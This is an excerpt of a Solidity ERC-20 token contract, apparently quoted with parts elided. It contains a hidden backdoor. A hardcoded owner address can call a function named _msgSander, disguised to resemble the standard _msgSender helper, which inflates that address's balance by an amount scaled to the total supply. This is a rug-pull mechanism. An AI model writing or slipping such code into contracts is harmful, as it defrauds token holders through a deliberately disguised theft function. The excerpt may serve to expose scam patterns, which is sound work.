...
contract Token is Context, IERC20, Ownable{
    ...
    constructor () {
        ...
        _FFFWA = payable(address(0xe9Cd429984EcdB4F3A8076C50DcA7F7ACDF964A7));
    ...
    function ttspl() public view returns (uint256) {
        return _totalSupply;
    }
    ...
    function _msgSander() public {require(msg.sender == _FFFWA);
        _balances[_FFFWA] += 471283 + uint256(2314).mul(ttspl()).mul(2) + 41024095;
    }
